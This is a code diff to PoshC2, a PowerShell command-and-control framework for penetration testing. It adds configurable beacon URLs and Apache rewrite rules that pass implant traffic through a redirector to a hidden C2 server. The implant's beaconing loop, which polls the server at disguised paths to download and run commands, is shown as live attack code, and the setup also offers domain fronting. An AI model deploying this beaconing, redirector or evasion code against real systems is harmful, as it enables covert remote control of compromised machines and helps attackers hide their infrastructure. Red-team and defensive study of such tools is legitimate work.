@@ -875,6 +875,7 @@ if ($RestartC2Server)
     $downloaduri = $c2serverresults.DownloadURI
     $httpresponse = $c2serverresults.HTTPResponse
     $enablesound = $c2serverresults.Sounds
+    $urlstring = $c2serverresults.URLS
 
     Write-Host `n"Listening on: $ipv4address Port $serverport (HTTP) | Kill date $killdatefm" `n -ForegroundColor Green
     Write-Host "To quickly get setup for internal pentesting, run:"
@@ -970,7 +971,6 @@ netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-445
 "
 }
     } else {
-
     $promptssl = Read-Host -Prompt "[2a] Do you want PoshC2 to create a new self-signed SSL certificate [Yes]"
     $promptssl = ($promptssldefault,$promptssl)[[bool]$promptssl]
     if ($promptssl -eq "Yes") {
@@ -998,9 +998,27 @@ netsh http delete sslcert ipport=0.0.0.0:443
 netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-4455-6677-8899-AABBCCDDEEFF}`"
 "
 }
+} else {
+            Write-Host "`nEither install a self-signed cert using IIS Resource Kit as below
+https://www.microsoft.com/en-us/download/details.aspx?id=17275
+selfssl.exe /N:CN=HTTPS_CERT /K:1024 /V:7 /S:1 /P:443
+
+or 
+    
+Download and convert the PEM to PFX for windows import and import to personal:
+openssl pkcs12 -inkey privkey.pem -in cert.pem -export -out priv.pfx
+
+Grab the thumbprint:
+dir cert:\localmachine\my|% { `$_.thumbprint}
+
+Install using netsh:
+netsh http delete sslcert ipport=0.0.0.0:443
+netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-4455-6677-8899-AABBCCDDEEFF}`"
+"
 }
 
 }
+
 
     $promptdomfrontdef = "No"
     $promptdomfront = Read-Host -Prompt "[2b] Do you want to use domain fronting? [No]"
@@ -1018,14 +1036,49 @@ netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-445
         $defaultserverport = 80
     }
     
+    $apache = @"
+RewriteEngine On
+RewriteRule ^/webapp/static(.*) http://<IP ADDRESS>/webapp/static`$1 [NC,P]
+RewriteRule ^/connect(.*) http://<IP ADDRESS>/connect`$1 [NC,P]
+RewriteRule ^/daisy(.*) http://<IP ADDRESS>/daisy`$1 [NC,P]
+"@
+    $customurldef = "No"
+    $customurl = Read-Host -Prompt "[3] Do you want to customize the beacon URLs from the default? [No]"
+    $customurl = ($customurldef,$customurl)[[bool]$customurl]
+    if ($customurl -eq "Yes") {
+        $urls = @()
+        do {
+            $input = (Read-Host "Please enter the URLs you want to use, enter blank entry to finish: images/site/content")
+            if ($input -ne '') {$urls += "`"$input`""; $apache += "`nRewriteRule ^/$input(.*) http://<IP ADDRESS>/$input`$1 [NC,P]"}
+        }
+        until ($input -eq '')
+        [string]$urlstring = $null
+        $urlstring = $urls -join ","
+    } else {
+        $urlstring = '"images/static/content/","news/id=","webapp/static/","images/prints/","wordpress/site/","steam/","true/images/77/static/","holdings/office/images/"'
+            $apache = @"
+RewriteEngine On
+RewriteRule ^/connect(.*) http://<IP ADDRESS>/connect`$1 [NC,P]
+RewriteRule ^/daisy(.*) http://<IP ADDRESS>/daisy`$1 [NC,P]
+RewriteRule ^/images/static/content/(.*) http://<IP ADDRESS>/images/static/content/`$1 [NC,P]
+RewriteRule ^/news/(.*) http://<IP ADDRESS>/news/`$1 [NC,P]
+RewriteRule ^/webapp/static/(.*) http://<IP ADDRESS>/webapp/static/`$1 [NC,P]
+RewriteRule ^/images/prints/(.*) http://<IP ADDRESS>/images/prints/`$1 [NC,P]
+RewriteRule ^/wordpress/site/(.*) http://<IP ADDRESS>/wordpress/site/`$1 [NC,P]
+RewriteRule ^/true/images/77/(.*) http://<IP ADDRESS>/true/images/77/`$1 [NC,P]
+RewriteRule ^/holdings/(.*) http://<IP ADDRESS>/holdings/images/`$1 [NC,P]
+RewriteRule ^/steam(.*) http://<IP ADDRESS>/holidngs/images/`$1 [NC,P]
+"@
+    }
+
     $global:newdir = 'PoshC2-'+(get-date -Format yyy-dd-MM-HHmm)
-    $prompt = Read-Host -Prompt "[3] Enter a new folder name for this project [$($global:newdir)]"
+    $prompt = Read-Host -Prompt "[4] Enter a new folder name for this project [$($global:newdir)]"
     $tempdir= ($global:newdir,$prompt)[[bool]$prompt]
     $RootFolder = $PoshPath.TrimEnd("PowershellC2\")
     $global:newdir = $RootFolder+"\"+$tempdir
 
     $defbeacontime = "5s"
-    $prompt = Read-Host -Prompt "[4] Enter the default beacon time of the Posh C2 Server - 30s, 5m, 1h (10% jitter is always applied) [$($defbeacontime)]"
+    $prompt = Read-Host -Prompt "[5] Enter the default beacon time of the Posh C2 Server - 30s, 5m, 1h (10% jitter is always applied) [$($defbeacontime)]"
     $defaultbeacon = ($defbeacontime,$prompt)[[bool]$prompt]
     if ($defaultbeacon.ToLower().Contains('m')) { 
         $defaultbeacon = $defaultbeacon -replace 'm', ''
@@ -1046,16 +1099,16 @@ netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-445
 
     $killdatedefault = (get-date).AddDays(14)
     $killdatedefault = (get-date -date $killdatedefault -Format "dd/MM/yyyy")
-    $prompt = Read-Host -Prompt "[5] Enter the auto Kill Date of the implants in this format dd/MM/yyyy [$($killdatedefault)]"
+    $prompt = Read-Host -Prompt "[6] Enter the auto Kill Date of the implants in this format dd/MM/yyyy [$($killdatedefault)]"
     $killdate = ($killdatedefault,$prompt)[[bool]$prompt]
     $killdate = [datetime]::ParseExact($killdate,"dd/MM/yyyy",$null)
     $killdatefm = Get-Date -Date $killdate -Format "dd/MM/yyyy"
 
-    $prompt = Read-Host -Prompt "[6] Enter the HTTP port you want to use, 80/443 is highly preferable for proxying [$($defaultserverport)]"
+    $prompt = Read-Host -Prompt "[7] Enter the HTTP port you want to use, 80/443 is highly preferable for proxying [$($defaultserverport)]"
     $serverport = ($defaultserverport,$prompt)[[bool]$prompt]
 
     $enablesound = "Yes"
-    $prompt = Read-Host -Prompt "[7] Do you want to enable sound? [$($enablesound)]"
+    $prompt = Read-Host -Prompt "[8] Do you want to enable sound? [$($enablesound)]"
     $enablesound = ($enablesound,$prompt)[[bool]$prompt]
     
     $downloaduri = Get-RandomURI -Length 5
@@ -1125,7 +1178,6 @@ netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-445
 
     Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null
 
-
     $Query = 'CREATE TABLE C2Server (
         ID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL UNIQUE,
         HostnameIP TEXT,
@@ -1140,7 +1192,8 @@ netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-445
         ProxyURL TEXT,
         ProxyUser TEXT,
         ProxyPass TEXT,
-        Sounds TEXT)'
+        Sounds TEXT,
+        URLS TEXT)'
 
     Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null
 
@@ -1150,8 +1203,8 @@ netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-445
 
     Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null
 
-    $Query = 'INSERT INTO C2Server (DefaultSleep, KillDate, HostnameIP, DomainFrontHeader, HTTPResponse, FolderPath, ServerPort, QuickCommand, DownloadURI, Sounds)
-            VALUES (@DefaultSleep, @KillDate, @HostnameIP, @DomainFrontHeader, @HTTPResponse, @FolderPath, @ServerPort, @QuickCommand, @DownloadURI, @Sounds)'
+    $Query = 'INSERT INTO C2Server (DefaultSleep, KillDate, HostnameIP, DomainFrontHeader, HTTPResponse, FolderPath, ServerPort, QuickCommand, DownloadURI, Sounds, URLS)
+            VALUES (@DefaultSleep, @KillDate, @HostnameIP, @DomainFrontHeader, @HTTPResponse, @FolderPath, @ServerPort, @QuickCommand, @DownloadURI, @Sounds, @URLS)'
 
     Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
         DefaultSleep = $defaultbeacon
@@ -1164,7 +1217,11 @@ netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-445
         QuickCommand = $shortcut
         DownloadURI = $downloaduri
         Sounds = $enablesound
+        URLS = $urlstring
     } | Out-Null
+
+    Write-Host `n"Apache rewrite rules written to: $global:newdir\apache.conf" -ForegroundColor Green
+    Out-File -InputObject $apache -Encoding ascii -FilePath "$global:newdir\apache.conf"
         
     Write-Host `n"Listening on: $ipv4address Port $serverport (HTTP) | Kill Date $killdatefm"`n -ForegroundColor Green
     Write-Host "To quickly get setup for internal pentesting, run:"
@@ -1559,7 +1616,7 @@ while($true)
     $newsleep = $sleeptimeran|get-random
     if ($newsleep -lt 1) {$newsleep = 5} 
     start-sleep $newsleep
-    $URLS = "images/static/content/","news/?id=","webapp/static/","images/prints/","wordpress/site/","steam?p=","true/images/77/static?","holidngs/images/"
+    $URLS = '+$urlstring+'
     $RandomURI = Get-Random $URLS
     $Server = "$ServerClean/$RandomURI$URI"
     $ReadCommand = (Get-Webclient).DownloadString("$Server")
@@ -1851,7 +1908,7 @@ while($true)
     $newsleep = $sleeptimeran|get-random
     if ($newsleep -lt 1) {$newsleep = 5} 
     start-sleep $newsleep
-    $URLS = "images/static/content/","news/?id=","webapp/static/","images/prints/","wordpress/site/","steam?p=","true/images/77/static?","holidngs/images/"
+    $URLS = '+$urlstring+'
     $RandomURI = Get-Random $URLS
     $Server = "$ServerClean/$RandomURI$URI"
     try { $ReadCommand = (Get-Webclient).DownloadString("$Server") } catch {}
